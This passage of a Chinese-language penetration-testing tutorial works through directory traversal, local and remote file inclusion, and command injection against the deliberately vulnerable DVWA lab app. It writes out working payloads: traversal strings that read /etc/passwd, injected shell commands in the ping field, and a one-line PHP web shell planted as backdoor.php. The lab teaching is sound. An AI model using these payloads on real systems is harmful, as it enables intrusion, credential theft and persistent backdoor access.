命令注入是一种攻击类型，其主要目标是使系统命令由易受攻击的应用程序的主机操作系统执行。当不安全的用户输入从应用程序传递到系统 shell 时，这些类型的攻击是可能的。提供的命令以应用程序的特权级别执行，例如，Web 服务器可能以`www-data`用户或 Apache 用户而不是 root 用户运行。

目录遍历是指服务器允许攻击者读取正常 Web 服务器目录之外的文件或目录。

文件包含漏洞是一种允许攻击者通过利用易受攻击的包含过程将文件包含到 Web 服务器的漏洞。例如，当页面接收文件路径作为输入并且此输入未经适当清理时，就会发生这种类型的漏洞，从而允许攻击者注入目录遍历字符（`../`）。

文件包含，目录遍历和命令注入都是一起工作的攻击向量。

# 目录遍历和文件包含

让我们开始测试，看看我们是否可以让 Web 应用程序跳转到上一级目录。

我们将再次进入 DVWA 应用程序。登录并从左侧菜单导航到文件包含页面：

![](img/960d200a-726a-4737-9e48-a4058627a381.jpg)

在浏览器的地址栏中，您应该看到`<IP 地址>/dvwa/vulnerabilities/fi/?page=include.php`。让我们将`include.php`更改为`index.php`，看看会发生什么：

![](img/7d396c69-c85c-4608-9ea5-fe698301e84f.jpg)

![](img/63e95547-5f9f-461f-baa3-a64416f63e6c.jpg)

什么都没有发生，这表明在这个目录中没有`index.php`。但是我们知道`index.php`是存在的，它在`/dvwa`目录中。我们是怎么知道的呢？当我们使用 Burp Suite 来破解`login.php`页面的凭据时，我们看到成功登录会将用户重定向到`index.php`。您在浏览器中看不到`index.php`，因为`index.php`是 PHP 的默认根页面（ASP 的`default.asp`），因此默认情况下不会显示它。要测试，您只需在 DVWA 菜单中点击主页按钮，然后在`/dvwa`之后输入`/index.php`。这将带您到同样的主页。

再次导航到文件包含页面。查看 URL，我们看到我们目前在`/dvwa/vulnerability/fi/`，这是从我们的根目录`dvwa`向下两个目录。在浏览器的地址中，删除`include.php`，这次用`../../index.php`替换它。按下*Enter*，让我们看看会发生什么：

![](img/a7c902c8-f055-45ec-9b6c-6a88fc7d9c99.jpg)

果然，它把我们带到了主页。太好了。我们成功地遍历了 Web 服务器的目录结构，并且，由于我们使用了系统中的一个文件，我们现在知道**本地文件包含**（**LFI**）是可能的。

根据我们之前使用`sqlmap`和`nikto`的结果，我们知道这个`apache`服务器正在运行的操作系统是 Linux（Ubuntu）。在 Linux 中，默认情况下，`apache`将其文件存储在`/var/www/html/`目录中。Linux 将基本用户信息存储在`/etc/passwd`文件中，并将散列用户密码存储在`/etc/shadow`文件中。有了这个知识，让我们尝试改变目录以查看`/etc/passwd`文件。

再次在文件包含页面上，删除`include.php`，输入`../../../../../../etc/passwd`。

`../../../../../../`将我们带到了`/var/www/html/dvwa/vulnerability/fi/`，然后到了`/`：

![](img/d6487a78-666a-4aee-9284-022051392e82.jpg)

![](img/022de721-b309-411c-a6ae-b65448ed2bc0.jpg)

我们成功地向上改变了六个目录，然后向下改变了一个目录到`/etc`，获得了对`passwd`文件的访问。我们看到的是`passwd`文件的内容。

这是它复制到文本文件并清理后的截图：

![](img/051c5396-7aab-44f8-96b2-0c3acdd40cea.jpg)

冒号后的`x`表示这个帐户有密码，并且它以散列形式存储在`/etc/shadow`文件中。

知道我们可以遍历目录并且 LFI 是可能的，现在让我们尝试一下**远程文件包含**（**RFI**）攻击。

我们的下一步是将一个文件从远程服务器（我们的 Kali 系统）传递到我们的目标系统。在终端中，输入以下内容：

```
service apache2 start
```

这启动了我们系统上的`apache` Web 服务器。您可以通过转到浏览器，输入您的系统 IP，然后会看到默认的`apache` HTML 页面来测试它。

回到 DVWA 应用程序，在文件包含页面导航。在地址栏中，用您的`webserver/index.html`的路径替换`include.php`：

![](img/58b45f1e-0414-4116-b741-1659f157f4b1.jpg)

它成功地打开了`index.html`，这是托管在我们的 Web 服务器上的。在这个系统上可能发生 RFI：

![](img/e0204f7d-5e25-4a31-a112-8d41eed6f097.jpg)

# 命令执行

命令注入漏洞允许攻击者将命令注入到验证不足的用户输入中。这个输入以某种形式被系统 shell 使用，在这个过程中，注入的命令在系统上被执行。

有一种情况是，您可能会发现这是一个应用程序，它接受用户输入，例如用户名或电子邮件地址，并在系统上创建一个用于存储用户数据、文件上传等的文件夹。

在我们的目标系统 DVWA 中，有一个页面用于演示这个缺陷，通过利用传递给系统 ping 命令的用户输入。让我们再次登录到 OWASP Broken Apps VM 上的 DVWA，并从左侧菜单中选择命令注入：

![](img/b3b29310-7227-4a21-9efb-c8409a910a60.jpg)

如前所述，这个输入被传递给 ping 命令，应该是一个 IP 地址。我们可以通过传递`127.0.0.1`来确认这一点：

![](img/67be9982-8445-40b7-8f7e-83d998f88049.jpg)

我们得到了预期的结果。现在，让我们尝试将另一个命令传递到这个输入中。我们知道这个应用程序正在 Linux 上托管。在 Linux 中，我们可以使用`&&`来连接命令。

使用`&&`，前一个命令必须成功完成，然后才能执行下一个命令。`;`将执行命令，无论前一个是否成功完成。让我们尝试一个基本的`ls`命令。在输入框中，输入`127.0.0.1; ls`，然后点击提交：

![](img/92f93794-3eab-4af8-a70c-49476382b33b.jpg)

现在我们已经确认，在处理之前没有验证输入，因为 ping 统计后的行显示了当前目录的文件。我们可以扩展这一点，获取我们所在的当前目录以及执行命令的用户是谁。输入`127.0.0.1`；`pwd`；`whoami`：

![](img/969d3e82-1248-4e80-b20a-3e820bec1624.jpg)

从我们的结果中，我们看到我们目前在`/owaspbwa/dvwa-git/vulnerabilities/exec`目录中，并且我们正在以`www-data`用户的身份执行命令。现在让我们尝试打印文件的内容，特别是`/etc/passwd`文件。在输入框中，输入`127.0.0.1`和`cat /etc/paswd`：

![](img/dd2b0c08-949f-46af-ab68-60bb8f2ac836.jpg)

这个片段应该看起来像我们之前 LFI 的结果。

让我们再做一件事。让我们在目录中创建一个文件，以便以后可以参考这个文件来执行命令。输入`127.0.0.1`和`echo “<?php system(\$_GET[‘cmd’]) ?>” > backdoor.php`。这应该创建一个名为`backdoor`的 PHP 文件，里面的 PHP 代码应该是`system (\$_GET[‘cmd’])`。

现在，在浏览器中导航到`<ip address>/dvwa/vulnerabilities/exec/backdoor.php`。

页面加载了，但是没有显示任何内容。这是因为我们还没有传递任何命令。看看我们输入的内容，在单引号中我们有`cmd`。这是我们的变量，用于存储我们想要执行的命令，并将其传递给系统执行。要执行一个命令，在地址栏中的`backdoor.php`后面，输入`?cmd=`，然后输入你的命令。我将使用`ls`作为一个基本演示：

![](img/eed2b93b-7672-43f3-86a4-03ef5d90ad26.jpg)

从这一点开始，可以���挥你的想象力，尝试不同的可能性。诚然，演示需要一些工作，但你可以随时查看源代码进行清理：

![](img/aa4904c9-ae34-46bf-8804-5e1c3f77859a.jpg)

我想补充一点，你可以使用 Burp Suite 中的 Repeater 来执行这些步骤，你也可以将 Burp Suite 与`sqlmap`和 Metasploit 一起使用来获得一个 meterpreter shell。

# 摘要

在本章中，我们看了一些用于 Web 应用程序测试的主要工具，通过延伸，云应用程序也是如此，因为它们建立在相同的协议上并使用许多相同的平台。

正如你所看到的，这些漏洞有一个共同的根本原因，即用户输入没有经过净化或验证，以确保所需的数据被用于处理。此外，对一个漏洞的利用可以允许另一个漏洞被利用（例如目录遍历到文件包含）。

我们使用 OWASP ZAP、Nikto、`sqlmap`和 Burp Suite 来识别可能的漏洞，测试它们并利用它们。然而，Kali 还配备了许多其他工具，可以用来进行这些测试，许多工具可以一起使用。

Burp Suite 和 OWASP ZAP 特别是非常强大的独立工具，可以完成我们所看到的一切，甚至一些我们没有看到的东西。我们甚至可以使用它们进行目录遍历和文件包含测试。

一些其他要看的工具如下：

+   Commix（命令注入漏洞工具）

+   DirBuster（Web 服务器目录暴力破解工具）

+   Recon-NG（网络侦察工具）

+   Sqlninja（Microsoft SQL 注入工具）

在下一章中，我们将看一下无线网络分析，使用各种工具攻击网络以获取访问权限，并保持对网络的访问的方法。我们甚至会看一下设置恶意双子（Rogue AP）的初始步骤。

# 进一步阅读

有许多资源可供了解更多关于 Web 和云应用程序测试的信息。以下是一些资源：

+   *Kali Linux Web 渗透测试食谱-第二版*（Packt Publishing）

+   OWASP 十大 2017 年- 十大最关键的 Web 应用安全风险：[`www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf`](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)

+   OWASP 基金会：[`www.owasp.org/index.php/Main_Page`](https://www.owasp.org/index.php/Main_Page)
